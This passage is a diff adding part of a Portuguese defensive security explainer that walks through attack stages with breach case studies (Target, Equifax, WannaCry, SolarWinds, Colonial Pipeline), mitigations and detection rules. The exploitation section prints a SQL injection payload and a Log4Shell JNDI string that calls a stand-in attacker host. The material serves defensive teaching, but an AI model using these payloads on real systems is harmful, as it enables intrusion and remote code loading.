+      <h4><span class="tag case-tag">Caso</span> Target, 2013 — credenciais de um prestador e 40 milhões de cartões</h4>
+      <p>
+        Os atacantes entraram na rede da Target com credenciais de rede roubadas à
+        <strong>Fazio Mechanical Services</strong>, a prestadora de AVAC e refrigeração da Target. Colocaram depois
+        malware de captura de cartões nos sistemas de ponto de venda e enviaram os dados roubados para servidores
+        externos de recolha. A imprensa atribui o roubo das credenciais a um email de phishing com malware; o
+        relato legível confirma as credenciais do prestador como entrada e estabelece o phishing com menos
+        firmeza <a href="#ref-21-pt">[21]</a><a href="#ref-22-pt">[22]</a>.
+      </p>
+      <ul class="facts">
+        <li>Cerca de <b>40 milhões</b> de contas de cartões de débito e crédito ficaram expostas <a href="#ref-21-pt">[21]</a>.</li>
+        <li>A comunicação da Target de 2015 mostra, segundo a imprensa, <b>252 milhões de dólares</b> em despesas acumuladas com a violação, compensadas por <b>90 milhões</b> de seguro, num líquido de <b>162 milhões</b> <a href="#ref-23-pt">[23]</a>.</li>
+        <li>A falha de controlo não foi uma correcção em falta. Foi <b>a credencial de um terceiro a chegar aos sistemas de pagamento</b>, que deviam ser inalcançáveis a partir daquele caminho de rede.</li>
+      </ul>
+    </div>
+
+    <div class="code">
+      <div class="code-bar"><span class="dot y"></span><span class="fname">cabeçalhos da mensagem — como se vê uma verificação de phishing falhada</span><span class="lang">text</span></div>
+<pre><code>Authentication-Results: mx.example.com;
+       <span class="bad">dkim=fail</span> (no key for domain) header.d=<span class="bad">examp1e-billing.com</span>;
+       <span class="bad">spf=fail</span>  smtp.mailfrom=mail-9x.examp1e-billing.com;
+       <span class="bad">dmarc=fail</span> action=none header.from=examp1e-billing.com
+Received-SPF: fail (mx.example.com: domain of examp1e-billing.com
+  does not designate <span class="n">185.203.16.77</span> as permitted sender)
+
+<span class="c"># Leia os três sinais: um domínio parecido (o dígito "1" em vez de um "l"),</span>
+<span class="c"># um IP de envio que o domínio nunca autorizou, e action=none —</span>
+<span class="c"># ou seja, este receptor estava configurado para observar, não para impor.</span></code></pre>
+    </div>
+
+    <div class="code">
+      <div class="code-bar"><span class="dot g"></span><span class="fname">a mesma caixa de correio, depois de impor o DMARC</span><span class="lang">dns</span></div>
+<pre><code><span class="c">; _dmarc.example.com — começar em p=none para observar, depois impor.</span>
+_dmarc  TXT  <span class="s">"v=DMARC1; p=reject; sp=reject; adkim=s; aspf=s; pct=100;
+              rua=mailto:dmarc-aggregate@example.com"</span>
+
+<span class="c">; p=reject diz aos receptores para recusar correio que falhe o alinhamento.</span>
+<span class="c">; A mesma mensagem passa a ser um devolvido, não um item na caixa de entrada.</span>
+
+<span class="c">; Estes dois registos apanham tanto PMEs como fornecedores falsificados:</span>
+_dmarc  TXT  <span class="s">"v=DMARC1; p=reject; pct=100"</span>
+@       TXT  <span class="s">"v=spf1 include:mailprovider.example -all"</span>   <span class="c">; -all = falha dura</span></code></pre>
+    </div>
+
+    <div class="callout info">
+      <p><b>Sobre a fadiga de MFA, a orientação é específica.</b> A orientação da CISA de Outubro de 2022 insta
+      fortemente as organizações a implementar MFA <em>resistente a phishing</em>, e diz que, onde tal ainda não é
+      possível e se usam notificações push, se deve activar a <strong>correspondência de números</strong> como
+      mitigação interina. A CISA é explícita ao dizer que a correspondência de números não é tão forte como MFA
+      resistente a phishing, e identifica o <strong>FIDO/WebAuthn</strong> como a única opção amplamente disponível
+      com essa resistência <a href="#ref-16-pt">[16]</a><a href="#ref-17-pt">[17]</a>.</p>
+    </div>
+
+    <details class="deep">
+      <summary>Porque “formar os utilizadores” não é um controlo</summary>
+      <div class="body">
+        <p>
+          A formação ajuda, mas compete contra um profissional cujo trabalho é essa única mensagem, entregue em
+          escala, muitas vezes durante um processo de negócio real — uma factura, um aviso de entrega, um alerta de
+          entrada inesperada. A taxa de falha só precisa de ser diferente de zero uma vez. Trate o julgamento do
+          utilizador como <em>sinal de detecção</em>, nunca como barreira: botões de denúncia de phishing, uma
+          cultura que recompense a denúncia e, acima de tudo, controlos técnicos — MFA resistente a phishing,
+          imposição da autenticação de email e procedimentos de verificação no help desk — são o que realmente
+          fecha o caminho.
+        </p>
+      </div>
+    </details>
+
+    <div class="defense">
+      <h4>O que o trava</h4>
+      <ul>
+        <li><b>MFA resistente a phishing</b> — chaves de segurança e passkeys FIDO2/WebAuthn. Uma palavra-passe escrita numa página falsa é inútil quando o factor está ligado à origem verdadeira.</li>
+        <li><b>Correspondência de números</b> como passo interino, se o push ainda estiver em uso <a href="#ref-16-pt">[16]</a>.</li>
+        <li><b>Verificação de identidade no help desk</b> com perguntas de desafio fora de banda e uma chamada de retorno para um número do directório — e limites rígidos sobre quem pode repor um administrador.</li>
+        <li><b>DMARC em p=reject, SPF e DKIM alinhados</b> nos seus domínios, e regras que ponham em quarentena as falhas de entrada.</li>
+        <li><b>Acesso condicional</b> que considere a postura do dispositivo e a localização, para que uma sessão roubada de um contexto invulgar seja desafiada.</li>
+        <li><b>Separar o terceiro.</b> O acesso de fornecedores e prestadores deve ser o seu próprio plano de identidade, de menor privilégio, sem caminho para o ambiente de pagamentos — a lição da Target <a href="#ref-21-pt">[21]</a>.</li>
+      </ul>
+    </div>
+  </div>
+</section>
+<section id="pt-l4">
+  <h2 class="big">Nível 4 · Explorar um serviço exposto</h2>
+
+  <div class="level" style="--c:#f85149">
+    <div class="level-head">
+      <span class="num">4</span>
+      <div>
+        <h3>Quando o próprio software se pode virar contra si</h3>
+        <p class="tactic">MITRE ATT&amp;CK <b>T1190 Exploit Public-Facing Application</b> · Execução remota de código, injecção, desserialização</p>
+      </div>
+    </div>
+    <p>
+      Este é o nível que a maioria das pessoas imagina. É também aquele em que a disciplina de
+      <em>corrigir e inventariar</em> decide o resultado, porque a falha é quase sempre pública: um aviso
+      do fabricante, um CVE e uma correcção que já estava disponível antes do ataque. O DBIR da Verizon
+      de 2024 registou a exploração de vulnerabilidades como ponto de entrada inicial em <strong>14% das
+      violações, +180% face ao ano anterior</strong> <a href="#ref-4-pt">[4]</a>.
+    </p>
+
+    <div class="case">
+      <h4><span class="tag case-tag">Caso</span> Equifax, 2017 — um Apache Struts sem correcção <span class="tag cve">CVE-2017-5638</span></h4>
+      <p>
+        A declaração da própria Equifax é inequívoca quanto ao vector: o ataque “ocorreu através de uma
+        vulnerabilidade no Apache Struts (<strong>CVE-2017-5638</strong>)”, afectando a aplicação web que
+        suportava o seu portal de litígios em linha nos EUA <a href="#ref-8-pt">[8]</a>. A falha permitia
+        execução remota de código no servidor.
+      </p>
+      <ul class="facts">
+        <li>A Equifax reportou inicialmente informação que afectava <b>143 milhões de consumidores norte-americanos</b> <a href="#ref-8-pt">[8]</a>. A FTC descreveu depois a violação como afectando aproximadamente <b>147 milhões de pessoas</b>, incluindo <b>145,5 milhões de números de segurança social</b> e <b>209 mil números de cartões de pagamento</b> <a href="#ref-9-pt">[9]</a>.</li>
+        <li>O acordo com a FTC foi de <b>pelo menos 575 milhões de dólares, e potencialmente até 700 milhões</b> — um valor de acordo, não uma medida da perda económica total <a href="#ref-9-pt">[9]</a>.</li>
+        <li>Um detalhe muito repetido — um certificado de inspecção TLS expirado que escondia o tráfego de exfiltração — é uma <b>falha de monitorização e visibilidade, não o vector de acesso inicial</b>. O vector foi a falha do Struts. O certificado expirado é a razão pela qual meses de tráfego roubado podem não ter sido inspeccionados <a href="#ref-10-pt">[10]</a>.</li>
+      </ul>
+    </div>
+
+    <div class="code">
+      <div class="code-bar"><span class="dot r"></span><span class="fname">a família da injecção — porque “o dado passou a ser o programa”</span><span class="lang">sql</span></div>
+<pre><code><span class="c">-- ✖ A entrada é concatenada directamente na instrução, por isso é analisada como código.</span>
+SELECT id, role FROM users
+WHERE email = <span class="bad">'$email'</span> AND pw_hash = <span class="bad">'$hash'</span>;
+
+<span class="c">-- Envie  email =  ' OR '1'='1' --   e o predicado fica verdadeiro para todas as linhas.</span>
+SELECT id, role FROM users
+WHERE email = <span class="bad">'' OR '1'='1' --'</span> AND pw_hash = <span class="bad">''</span>;</code></pre>
+    </div>
+
+    <div class="code">
+      <div class="code-bar"><span class="dot g"></span><span class="fname">a correcção — separar a consulta dos dados, definitivamente</span><span class="lang">python</span></div>
+<pre><code><span class="c"># ✓ A instrução é fixa antes de os valores existirem. Um dado nunca pode passar a código.</span>
+cur.execute(
+    <span class="s">"SELECT id, role FROM users WHERE email = %s AND pw_hash = %s"</span>,
+    (email, pw_hash),
+)
+
+<span class="c"># A injecção não é só SQL. O mesmo modo de falha aparece em:</span>
+<span class="c">#   • comandos de shell (subprocess com shell=True e uma string do utilizador)</span>
+<span class="c">#   • motores de modelos (entrada renderizada como modelo, não como dado)</span>
+<span class="c">#   • desserialização (um parser que pode instanciar objectos arbitrários)</span>
+<span class="c">#   • privilégios do utilizador da base de dados (torne-o também de menor privilégio)</span></code></pre>
+    </div>
+
+    <div class="callout danger">
+      <p><b>O Log4Shell foi a mesma ideia, em todo o lado ao mesmo tempo.</b> O Log4j 2 conseguia resolver
+      pesquisas JNDI ao substituir valores numa mensagem de registo, por isso <em>qualquer</em> string
+      controlada pelo atacante que a aplicação viesse a registar podia ser avaliada. Descrição da CISA: “A
+      vulnerabilidade existe na acção que a Java Naming and Directory Interface (JNDI) toma para resolver
+      variáveis”, em versões que “não protegiam contra” endpoints JNDI controlados pelo adversário. Gama
+      afectada: Log4j <strong>2.0-beta9 a 2.14.1</strong>, divulgada em <strong>10 de Dezembro de
+      2021</strong> <a href="#ref-31-pt">[31]</a>. A CISA disse que a ubiquidade do Java, a facilidade de
+      exploração e o custo da mitigação o tornavam excepcionalmente grave, notando que o Log4j estava
+      incorporado em <strong>“milhares de produtos em todo o mundo”</strong> <a href="#ref-31-pt">[31]</a><a href="#ref-32-pt">[32]</a>.</p>
+    </div>
+
+    <div class="code">
+      <div class="code-bar"><span class="dot r"></span><span class="fname">SomeService.java — o padrão, numa única chamada de registo</span><span class="lang">java</span></div>
+<pre><code><span class="c">// Vulnerável em Log4j 2.0-beta9 .. 2.14.1. Tudo o que esta linha toca</span>
+<span class="c">// é *avaliado*, não apenas impresso.</span>
+logger.info(<span class="s">"Login attempt for user: {}"</span>, request.getHeader(<span class="s">"User-Agent"</span>));
+
+<span class="c">// Um User-Agent com uma pesquisa JNDI acaba resolvido por LDAP, e em</span>
+<span class="c">// configurações vulneráveis a resposta pode fornecer uma classe a carregar:</span>
+<span class="c">//     ${jndi:ldap://attacker.example/a}</span>
+<span class="c">// (padrão ilustrativo — as strings exactas usadas no terreno variavam)</span></code></pre>
+    </div>
+
+    <div class="code">
+      <div class="code-bar"><span class="dot g"></span><span class="fname">log4j2.properties — mitigação interina, depois a correcção real</span><span class="lang">properties</span></div>
+<pre><code><span class="c"># Interino, aplicado em horas durante Dezembro de 2021: impedir que as</span>
+<span class="c"># substituições façam pesquisas.</span>
+<span class="v">log4j2.formatMsgNoLookups</span>=<span class="s">true</span>
+
+<span class="c"># Melhor: remover a classe JndiLookup do jar, para que a funcionalidade</span>
+<span class="c"># esteja fisicamente ausente mesmo que se tente uma pesquisa.</span>
+<span class="c">#   zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class</span>
+
+<span class="c"># Correcto: actualizar. Estas opções desaparecem em versões posteriores, onde</span>
+<span class="c"># o JNDI vem desactivado por omissão e as pesquisas têm de ser autorizadas.</span>
+<span class="c">#   log4j2.enableJndiLookup=false</span>
+<span class="c">#   log4j2.enableJndiJms=false</span>
+<span class="c">#   log4j2.enableJndiContextSelector=false</span></code></pre>
+    </div>
+
+    <div class="case">
+      <h4><span class="tag case-tag">Caso</span> WannaCry, 2017 — um worm que precisava de uma correcção em falta <span class="tag cve">MS17-010</span></h4>
+      <p>
+        O dropper do WannaCry espalhava-se por SMBv1 usando a exploração <strong>EternalBlue</strong>,
+        associada a <strong>MS17-010</strong>. O alerta da CISA descreve o dropper a “propagar-se pela
+        exploração MS17-010/EternalBlue SMBv1.0”: sondava gamas de rede locais à procura de SMB no TCP
+        445, explorava sistemas Windows vulneráveis e instalava o componente de ransomware. Também
+        verificava um domínio kill-switch fixo — uma ligação bem-sucedida parava o dropper, e a falha de
+        ligação deixava a infecção continuar <a href="#ref-27-pt">[27]</a><a href="#ref-28-pt">[28]</a>.
+      </p>
+      <ul class="facts">
+        <li>MS17-010 é o boletim de segurança da Microsoft, não um CVE. Cobre <b>CVE-2017-0143 a CVE-2017-0148</b>; o EternalBlue é normalmente associado a <b>CVE-2017-0144</b> <a href="#ref-28-pt">[28]</a>.</li>
+        <li>A CISA reportou infecções em mais de <b>150 países</b> <a href="#ref-27-pt">[27]</a>.</li>
+        <li>Em Inglaterra, o National Audit Office apurou pelo menos <b>81 dos 236 trusts do NHS</b> afectados, além de 603 outras organizações do NHS. Foram identificadas <b>6 912 consultas canceladas</b>, e o NHS England estimou mais de <b>19 mil</b> no total. O NAO disse acreditar que nenhum dado de doentes foi comprometido ou roubado <a href="#ref-29b-pt">[29b]</a>.</li>
+        <li>A correcção existia. A falha foi um protocolo alcançável por worm e sem correcção continuar activo em sistemas que ninguém tinha acabado de actualizar.</li>
+      </ul>
+    </div>
+
+    <div class="code">
+      <div class="code-bar"><span class="dot g"></span><span class="fname">remover a superfície alcançável, não só o bug</span><span class="lang">powershell</span></div>
+<pre><code><span class="c"># Desactivar o SMBv1 por completo — o protocolo de que o EternalBlue dependia.</span>
+Disable-WindowsOptionalFeature -Online -FeatureName smb1protocol -NoRestart
+
+<span class="c"># E tornar a antiga superfície de exploração inalcançável de onde não pertence.</span>
+Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force
+
+<span class="c"># Confirmar que desapareceu mesmo:</span>
+Get-SmbServerConfiguration | Select-Object EnableSMB1Protocol</code></pre>
+    </div>
+
+    <details class="deep">
+      <summary>Quão mau foi o Log4Shell, em números que pode realmente citar</summary>
+      <div class="body">
+        <p>
+          Não existe uma contagem autorizada de todos os sistemas vulneráveis no mundo. Os números mais
+          citados são fotografias datadas de sondagens, não um censo. A Shadowserver, a sondar a partir de
+          uma lista inicial de cerca de 300 milhões de IPs responsivos conhecidos, reportou:
+        </p>
+        <ul>
+          <li><strong>13 294</strong> endereços IP únicos vulneráveis e virados para a internet em 109 países, com dados recolhidos entre <strong>11 e 13 de Dezembro de 2021</strong> <a href="#ref-33-pt">[33]</a>.</li>
+          <li>Um seguimento com dados recolhidos entre <strong>16 e 22 de Dezembro</strong> encontrou <strong>8 472</strong> IPs únicos virados para a internet a alojar <strong>10 951 instâncias</strong> — um IP podia expor mais do que uma instância <a href="#ref-34-pt">[34]</a>.</li>
+        </ul>
+        <p>
+          São máquinas viradas para a internet detectadas. Não dizem nada sobre sistemas internos, cópias
+          embutidas ou organizações que nunca apareceram numa sondagem — e é exactamente por isso que a
+          correcção levou meses em parques grandes.
+        </p>
+      </div>
+    </details>
+
+    <div class="defense">
+      <h4>O que o trava</h4>
+      <ul>
+        <li><b>Saber o que corre.</b> Listas de materiais de software e inventário de dependências transformam um CVE surpresa numa consulta que já consegue responder.</li>
+        <li><b>Corrigir a relógio</b>, não a humor: criticidades viradas para a internet com SLA de horas a dias, e um processo de excepção rigoroso.</li>
+        <li><b>Corrigir a classe, não a instância.</b> Consultas parametrizadas, desserialização segura, nenhum <code>shell=True</code> sobre entrada do utilizador — para a próxima injecção não entrar.</li>
+        <li><b>Reduzir a superfície alcançável.</b> Retirar o SMBv1, fechar portas não usadas, manter os planos de gestão fora da internet.</li>
+        <li><b>Filtrar a saída.</b> A maioria destas explorações precisa de telefonar para fora depois; uma rede que não alcança máquinas arbitrárias quebra a cadeia.</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<section id="pt-l5">
+  <h2 class="big">Nível 5 · Escalar e mover</h2>
+
+  <div class="level" style="--c:#e3b341">
+    <div class="level-head">
+      <span class="num">5</span>
+      <div>
+        <h3>Um ponto de apoio não é o objectivo — o domínio é</h3>
+        <p class="tactic">MITRE ATT&amp;CK <b>T1003 OS Credential Dumping</b> · <b>T1550.002 Pass the Hash</b> · <b>TA0008 Lateral Movement</b></p>
+      </div>
+    </div>
+    <p>
+      Uma única estação comprometida vale pouco. A fase seguinte é transformá-la nas chaves de tudo: roubar
+      credenciais da memória e do disco, encontrar contas com mais privilégio e mover-se entre sistemas com
+      <em>entradas válidas</em> em vez de explorações. É por isso que os defensores descrevem o movimento
+      lateral como a parte silenciosa de uma intrusão — uma credencial legítima e uma ferramenta nativa de
+      administração parecem quase exactamente um administrador a trabalhar até tarde.
+    </p>
+
+    <div class="callout info">
+      <p><b>Pass-the-hash, numa frase.</b> O MITRE define-o como autenticar <em>sem</em> a palavra-passe em
+      texto simples do utilizador: o atacante usa directamente um hash roubado, saltando todos os passos que
+      exigiriam o texto simples. Está classificado como <strong>T1550.002</strong>, em Movimento Lateral
+      <a href="#ref-46-pt">[46]</a>.</p>
+    </div>
+
+    <p>
+      O MITRE define o movimento lateral em sentido amplo — entrar e controlar sistemas remotos numa rede — e
+      nota que os atacantes exploram e pivotam por vários sistemas ou contas para atingir o objectivo, e que
+      credenciais legítimas e ferramentas nativas podem ser mais discretas do que instalar novo software de
+      acesso remoto <a href="#ref-47-pt">[47]</a>. Na prática, o instrumental já está muitas vezes na máquina
+      da vítima: interfaces de gestão, shells remotas, tarefas agendadas e consolas de administração.
+    </p>
+
+    <div class="code">
+      <div class="code-bar"><span class="dot y"></span><span class="fname">registo de segurança do Windows — a assinatura a procurar</span><span class="lang">text</span></div>
+<pre><code><span class="c">EventID 4624 — "An account was successfully logged on"</span>
+  Logon Type         : <span class="bad">3</span>              <span class="c">// entrada de rede, não uma sessão interactiva</span>
+  Authentication Pkg : <span class="bad">NTLM</span>           <span class="c">// num ambiente só com Kerberos, pergunte porquê</span>
+  TargetUserName     : svc-backup
+  IpAddress          : 10.20.4.55        <span class="c">// uma *estação de trabalho*, origem de muitas entradas</span>
+
+<span class="c"># Uma estação a autenticar-se em muitos servidores por NTLM numa janela</span>
+<span class="c"># curta não é comportamento normal de utilizador. É a forma do movimento lateral.</span></code></pre>
+    </div>
+
+    <div class="code">
+      <div class="code-bar"><span class="dot g"></span><span class="fname">regra sigma — vale a pena alertar, não vale ignorar</span><span class="lang">yaml</span></div>
+<pre><code><span class="a">title</span>: NTLM network logon from a workstation to multiple hosts
+<span class="a">status</span>: experimental
+<span class="a">logsource</span>:
+  <span class="a">product</span>: windows
+  <span class="a">service</span>: security
+<span class="a">detection</span>:
+  <span class="a">selection</span>:
+    <span class="v">EventID</span>: <span class="n">4624</span>                 <span class="c"># conta autenticada com sucesso</span>
+    <span class="v">LogonType</span>: <span class="n">3</span>                <span class="c"># rede</span>
+    <span class="v">AuthenticationPackageName</span>: NTLM
+  <span class="a">filter_machine_accounts</span>:
+    <span class="v">TargetUserName|endswith</span>: <span class="s">'$'</span>
+  <span class="a">condition</span>: selection and not filter_machine_accounts
+<span class="a">level</span>: medium
+<span class="a">tags</span>:
+  - attack.lateral_movement
+  - attack.t1550.002</code></pre>
+    </div>
+
+    <details class="deep">
+      <summary>A cadeia de escalada, descrita genericamente</summary>
+      <div class="body">
+        <p>
+          Uma vez num servidor, a progressão normal é: <b>consciência situacional</b> (quem está autenticado,
+          que grupos tem, que sistemas confiam neste), <b>escalada local de privilégios</b> (serviços mal
+          configurados, directorias permissivas, caminhos sem aspas, endurecimento do kernel em falta),
+          <b>acesso a credenciais</b> (memória, entradas em cache, ficheiros de configuração, gestores de
+          segredos, repositórios do navegador — o <b>T1003 OS Credential Dumping</b> do MITRE
+          <a href="#ref-11-pt">[11]</a>), e depois <b>movimento lateral</b> com essas credenciais. Cada passo
+          é escolhido para não precisar de malware em disco, o que é precisamente o que torna as defesas
+          apenas de endpoint insuficientes.
+        </p>
+      </div>
+    </details>
+
+    <div class="defense">
+      <h4>O que o trava</h4>
+      <ul>
+        <li><b>Assumir a violação, segmentar a sério.</b> Administração em camadas, com máquinas e credenciais separadas para o controlo de domínio — nenhum administrador navega na web a partir de um controlador de domínio.</li>
+        <li><b>Proteger o material de credenciais no endpoint:</b> Credential Guard, protecção do LSA e remoção de credenciais de administrador em cache das estações.</li>
+        <li><b>Preferir Kerberos; tornar o NTLM numa excepção que se explica</b>, e monitorizar as excepções.</li>
+        <li><b>Gestão de Acesso Privilegiado</b> com elevação just-in-time e limitada no tempo, em vez de direitos de administrador permanentes.</li>
+        <li><b>Construir a detecção.</b> A regra Sigma acima é um ponto de partida; o valor real está numa linha de base que sabe como é o seu normal.</li>
+        <li><b>Restringir os caminhos laterais:</b> firewalls locais, âmbito de SMB/RPC e eliminação do “todos alcançam tudo”.</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<section id="pt-l6">
+  <h2 class="big">Nível 6 · Persistir, balizar, exfiltrar</h2>
+
+  <div class="level" style="--c:#39d353">
+    <div class="level-head">
+      <span class="num">6</span>
+      <div>
+        <h3>Misturar-se, e telefonar a casa a horas certas</h3>
+        <p class="tactic">MITRE ATT&amp;CK <b>T1071 Application Layer Protocol</b> · <b>T1219 Remote Access Software</b> · <b>T1195 Supply Chain Compromise</b></p>
+      </div>
+    </div>
+    <p>
+      Um servidor comprometido contacta periodicamente um servidor controlado pelo atacante — o
+      <em>beaconing</em> — para se identificar ou receber instruções. O tráfego viaja frequentemente em
+      protocolos comuns como HTTPS, DNS ou email, para parecer tráfego normal de negócio, e o MITRE nota que
+      comandos e muitas vezes os seus resultados podem ser embutidos em tráfego de protocolo de camada de
+      aplicação. O malware usa com frequência uma “ligação inversa ou back-connect” para um sistema
+      controlado pelo adversário <a href="#ref-48-pt">[48]</a><a href="#ref-49-pt">[49]</a><a href="#ref-50-pt">[50]</a>.
+    </p>
+
+    <div class="code">
+      <div class="code-bar"><span class="dot g"></span><span class="fname">caçar o batimento — a regularidade é o sinal</span><span class="lang">sql</span></div>
+<pre><code><span class="c">-- Sobre registos de ligações Zeek/Suricata: encontrar máquinas que falam com o</span>
+<span class="c">-- mesmo par a um ritmo de máquina, em volume modesto, durante muito tempo.</span>
+<span class="k">SELECT</span> id_orig_h, id_resp_h,
+       <span class="f">count</span>(*)                  <span class="k">AS</span> sessions,
+       <span class="f">stddev</span>(interval_seconds) <span class="k">AS</span> jitter_seconds
+<span class="k">FROM</span> (
+  <span class="k">SELECT</span> id_orig_h, id_resp_h, ts,
+         ts - <span class="f">lag</span>(ts) <span class="k">OVER</span> (
+              <span class="k">PARTITION BY</span> id_orig_h, id_resp_h <span class="k">ORDER BY</span> ts
+         ) <span class="k">AS</span> interval_seconds
+  <span class="k">FROM</span> conn
+) t
+<span class="k">WHERE</span> interval_seconds <span class="k">IS NOT NULL</span>
+<span class="k">GROUP BY</span> id_orig_h, id_resp_h
+<span class="k">HAVING</span> sessions &gt; <span class="n">200</span>
+   <span class="k">AND</span> jitter_seconds &lt; <span class="n">5</span>      <span class="c">-- humanos não produzem isto; os agendadores sim</span>
+<span class="k">ORDER BY</span> sessions <span class="k">DESC</span>;</code></pre>
+    </div>
+
+    <div class="case">
+      <h4><span class="tag case-tag">Caso</span> SolarWinds / SUNBURST, 2020 — a backdoor numa actualização de confiança</h4>
+      <p>
+        O caso de cadeia de fornecimento mais instrutivo de que há registo. Os atacantes comprometeram o
+        processo de compilação do software da SolarWinds e inseriram a backdoor SUNBURST no
+        <code>SolarWinds.Orion.Core.BusinessLayer.dll</code> assinado, distribuído nas actualizações do
+        Orion. O aviso da CISA descreve o adversário a acrescentar “uma versão maliciosa do binário … ao
+        ciclo de vida do software da SolarWinds”, que foi “assinada pelo certificado legítimo de assinatura
+        de código da SolarWinds” <a href="#ref-12-pt">[12]</a>.
+      </p>
+      <ul class="facts">
+        <li>O SUNBURST esperou então cerca de <b>12 a 14 dias</b> antes de fazer o que fosse, gerou pedidos DNS específicos da vítima sob o seu próprio domínio e usou as respostas DNS para encaminhar vítimas seleccionadas para infraestrutura de comando e controlo — disfarçando o tráfego como actividade legítima do Orion <a href="#ref-14-pt">[14]</a>.</li>
+        <li>A SolarWinds identificou depois o <b>SUNSPOT</b> como o malware que injectou o SUNBURST no ambiente de compilação; o instrumental seguinte incluiu o <b>TEARDROP</b>, um dropper só em memória, e o <b>Cobalt Strike BEACON</b> <a href="#ref-14-pt">[14]</a>.</li>
+        <li>O GAO reportou que quase <b>18 mil</b> clientes receberam uma actualização comprometida, enquanto o actor visava um <b>subconjunto menor de vítimas de alto valor</b>, incluindo organizações governamentais. A CISA documentou compromissos em organizações governamentais, de infraestrutura crítica e do sector privado dos EUA; o governo dos EUA atribuiu a actividade ao SVR russo <a href="#ref-13-pt">[13]</a><a href="#ref-12-pt">[12]</a>.</li>
+        <li>Note o que está <em>ausente</em>: <b>nenhum CVE identifica a backdoor em si</b>. Foi código malicioso inserido numa compilação, não a exploração de uma falha específica do Orion — e é exactamente por isso que uma abordagem de corrigir e sondar não lhe responde.</li>
+      </ul>
+    </div>
+
+    <div class="callout warn">
+      <p><b>A cadeia de fornecimento é hoje um problema corrente, não exótico.</b> O DBIR da Verizon de 2025
+      situou o envolvimento de terceiros em <strong>30% das violações — o dobro dos 15% do ano
+      anterior</strong> <a href="#ref-3-pt">[3]</a>. Pode ser perfeito e ainda assim ser violado através de
+      um fornecedor em que confia.</p>
+    </div>
+
+    <div class="defense">
+      <h4>O que o trava</h4>
+      <ul>
+        <li><b>Visibilidade e controlo da saída.</b> Saiba a que os seus servidores ligam, para onde e com que periodicidade. O beaconing precisa de um destino.</li>
+        <li><b>Primeiro a linha de base, depois os alertas.</b> Regras de detecção que não sabem dizer o que é normal produzem ruído, não achados.</li>
+        <li><b>Vigiar o pipeline de compilação como produção.</b> Infraestrutura de assinatura, agentes de compilação e artefactos de lançamento merecem o mesmo rigor que o centro de dados.</li>
+        <li><b>Risco de fornecedor com dentes:</b> integração de menor privilégio, capacidade de revogar e um plano para “e se esta actualização for hostil?” — incluindo implementação faseada.</li>
+        <li><b>O DNS como sensor.</b> Consultas longas ou de alta entropia e domínios recentes no tráfego de saída são detecções baratas e de alto sinal.</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<section id="pt-l7">
+  <h2 class="big">Nível 7 · Impacto e pagamento</h2>
+
+  <div class="level" style="--c:#f85149">
+    <div class="level-head">
+      <span class="num">7</span>
+      <div>
+        <h3>Quanto vale realmente o acesso — e para quem</h3>
+        <p class="tactic">MITRE ATT&amp;CK <b>TA0040 Impact</b> · Ransomware, dupla e tripla extorsão, fraude, venda de dados</p>
+      </div>
+    </div>
+    <p>
+      O acesso é um meio, não um fim. Os modelos de negócio que o convertem são poucos, e moldam o
+      comportamento do atacante ao longo dos níveis anteriores: um operador de ransomware quer
+      <em>largura</em> (muitos servidores, cópias, controlo de domínio), um intermediário de dados quer
+      <em>volume e singularidade</em>, e uma equipa de fraude quer <em>persistência silenciosa</em> — quanto
+      mais tempo ninguém dá por nada, mais o acesso rende.
+    </p>
+
+    <div class="tablewrap">
+      <table>
+        <thead><tr><th>Modelo de negócio</th><th>O que o atacante faz com o acesso</th><th>Do que precisa dos níveis anteriores</th></tr></thead>
+        <tbody>
+          <tr><td>Ransomware, extorsão simples</td><td>Cifrar dados e sistemas, vender a decifração</td><td>Níveis 5–6: controlo de domínio e cópias destruídas</td></tr>
+          <tr><td>Dupla / tripla extorsão</td><td>Cifrar <em>e</em> roubar e ameaçar publicar; por vezes assediar clientes directamente</td><td>Níveis 5–6 mais volume de exfiltração</td></tr>
+          <tr><td>Corretagem de dados</td><td>Exfiltrar e depois vender o acesso ou o conjunto de dados</td><td>Níveis 2–4 em escala, silêncio no nível 6</td></tr>
+          <tr><td>Compromisso de email empresarial</td><td>Personificar um executivo ou fornecedor e desviar um pagamento</td><td>Nível 3: uma caixa de correio basta</td></tr>
+          <tr><td>Fraude de transferência / desvio de pagamentos</td><td>Manipular um processo de negócio em vez de quebrar software</td><td>Nível 3 mais um processo de pagamento demasiado confiante</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="case">
+      <h4><span class="tag case-tag">Caso</span> Colonial Pipeline, 2021 — uma conta sem uso, uma falta de combustível</h4>
+      <p>
+        Um registo de audição do Congresso dos EUA afirma claramente: “Sabemos que os hackers exploraram uma
+        <strong>conta VPN desprotegida que já não estava em uso</strong>” para chegar à rede da Colonial
+        Pipeline, e que o pipeline esteve encerrado quase uma semana <a href="#ref-11b-pt">[11b]</a>. A conta
+        não exigia um código de uso único. A rede foi atingida com ransomware <strong>DarkSide</strong>. A
+        alegação de que a palavra-passe vinha especificamente de uma fuga de palavras-passe é
+        <em>reportada</em>, não estabelecida no registo oficial <a href="#ref-11b-pt">[11b]</a>.
+      </p>
+      <ul class="facts">
+        <li>O pipeline de 5 500 milhas esteve encerrado <b>quase uma semana</b> <a href="#ref-11b-pt">[11b]</a>.</li>
+        <li>A Colonial pagou um resgate reportado em <b>4,4 milhões de dólares</b>; o Departamento de Justiça anunciou depois ter apreendido uma parte substancial da criptomoeda paga aos extorsionários do DarkSide <a href="#ref-11b-pt">[11b]</a><a href="#ref-11c-pt">[11c]</a>.</li>
+        <li>Sem CVE. As fraquezas documentadas foram uma <b>conta VPN legada e inactiva</b> e a <b>ausência de um segundo factor</b> — níveis 1 e 2, não nível 4.</li>
+      </ul>
+    </div>
+
+    <div class="callout info">
+      <p><b>Sobre resgates, os dados são contra-intuitivos.</b> O DBIR de 2025 situou o valor mediano
+      realmente pago a grupos de ransomware em <strong>115 mil dólares</strong>, abaixo dos 150 mil do ano
+      anterior, e reportou que <strong>64% das organizações vítimas não pagaram nada</strong>
+      <a href="#ref-3-pt">[3]</a>. Pagar também não é uma medida de protecção de dados: na dupla extorsão, a
+      ameaça de divulgação sobrevive ao pagamento.</p>
+    </div>
+
+    <div class="case">
